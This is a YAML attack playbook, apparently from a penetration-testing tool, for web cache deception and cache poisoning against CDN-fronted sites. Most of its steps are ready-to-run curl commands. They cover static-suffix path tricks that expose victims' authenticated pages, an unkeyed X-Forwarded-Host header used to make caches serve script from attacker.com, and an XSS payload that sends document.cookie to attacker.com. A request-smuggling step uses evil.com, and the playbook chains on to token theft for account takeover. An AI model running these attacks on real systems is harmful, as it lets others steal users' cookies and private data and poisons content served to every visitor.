id: cache-deception-poisoning
name: "Web — Web cache deception + cache poisoning"
description: >
  Two related attack families against CDNs / reverse proxies:
  - Cache DECEPTION: trick the cache into storing authenticated pages
    under a path the attacker can fetch publicly.
  - Cache POISONING: inject malicious content into a cache entry that
    everyone else then receives.
tags: [web, cache, cdn, deception, poisoning]
difficulty: medium

inputs:
  - name: target_url
    description: "App fronted by a CDN / cache (CloudFlare, Akamai, Varnish, etc.)."
    required: true

steps:
  - id: identify_cache
    name: "Confirm there's a cache + how it differentiates"
    inline_command: |
      curl -I '<url>'  # Look for: Age, X-Cache, CF-Cache-Status, Via headers
      curl -I '<url>?xy=1'  # check if query string is part of cache key
    inputs:
      url: "${target_url}"
    notes: |
      Indicators of a cache:
        X-Cache: HIT/MISS
        CF-Cache-Status: HIT/MISS/DYNAMIC
        Age: <seconds>
        Via: 1.1 varnish
      Cache key elements you can probe: Host, path, query string, specific
      headers (Accept-Language, X-Forwarded-Host).

  - id: cache_deception_static_suffix
    name: "Cache deception: append /attacker.css to authenticated URL"
    inline_command: |
      # Authenticated victim visits:
      #   https://target.com/profile/attacker.css
      # CDN sees ".css" → treats as static → caches the response.
      # Origin still returns the profile page (path-traversal-style routing).
      # Attacker fetches:
      curl '<url>/profile/anything.css'  # → victim's profile data!
    inputs:
      url: "${target_url}"
    notes: |
      Variants per CDN:
        /profile.css            ← match-any-suffix
        /profile;foo.css        ← semicolon trick (AWS CloudFront)
        /profile%2fimg.png      ← URL-encoded slash
        /profile/..%2fimg.png   ← encoded traversal
      Document.write the cookie too — get any sensitive data that the
      origin sent back.

  - id: poison_via_x_forwarded_host
    name: "Poison cache via unkeyed header (X-Forwarded-Host)"
    inline_command: |
      # Many origins build absolute URLs from X-Forwarded-Host without
      # validating it. If that's reflected in the response AND not part of
      # the cache key:
      curl '<url>/' -H 'X-Forwarded-Host: attacker.com'
      # Response includes: <script src="https://attacker.com/a.js"></script>
      # Cache stores response keyed only by path → every subsequent user
      # gets your XSS.
    inputs:
      url: "${target_url}"
    notes: |
      Param Miner (Burp extension) automatically discovers unkeyed headers.
      Test for each that reaches the origin: X-Forwarded-Host, X-Host,
      X-Original-URL, X-Rewrite-URL, X-Original-Forwarded-For.

  - id: cache_key_normalization
    name: "Cache key normalization quirks (path + query)"
    inline_command: |
      # CDN may strip ?utm_* params for caching; attacker fetches:
      curl '<url>/?utm_source=evil"><script>fetch(\"http://attacker.com/?d=\"+document.cookie)</script>'
      # If the origin reflects the unstripped query in the body but the CDN
      # caches it under the stripped key → poisoned response to everyone.
    inputs:
      url: "${target_url}"

  - id: smuggle_then_cache
    name: "Request smuggling → poison shared cache"
    inline_command: |
      # When front-end (CDN) and back-end disagree on Content-Length vs
      # Transfer-Encoding, you can smuggle a second request that the
      # back-end will treat as belonging to the NEXT user — and prefix it
      # with cache poisoning gadgets like:
      # GET /js/main.js HTTP/1.1
      # Host: target.com
      # X-Forwarded-Host: evil.com
      # → that response (with reflected evil.com) caches under /js/main.js
      echo "Use Burp HTTP Request Smuggler extension to detect + exploit."

  - id: cleanup_check
    name: "Confirm cache poisoning works AND check eviction"
    inline_command: |
      # 1) Fire poison request.
      # 2) Wait 1 second.
      # 3) Fetch normally:
      curl -I '<url>/' | head -10
      # Expect: Age > 0, X-Cache: HIT, and the body contains your payload.
      # 4) Track TTL — your poison lives until the cache evicts the entry.
    inputs:
      url: "${target_url}"

references:
  - title: "PortSwigger — Cache poisoning"
    url:   "https://portswigger.net/web-security/web-cache-poisoning"
  - title: "Cache deception (Omer Gil)"
    url:   "https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html"
  - title: "Param Miner"
    url:   "https://github.com/PortSwigger/param-miner"

next_chains:
  - chain: csrf-and-token-leak
    when:   'poisoned response steals tokens'
    reason: 'Chain cache poisoning XSS with CSRF/token theft for full takeover.'
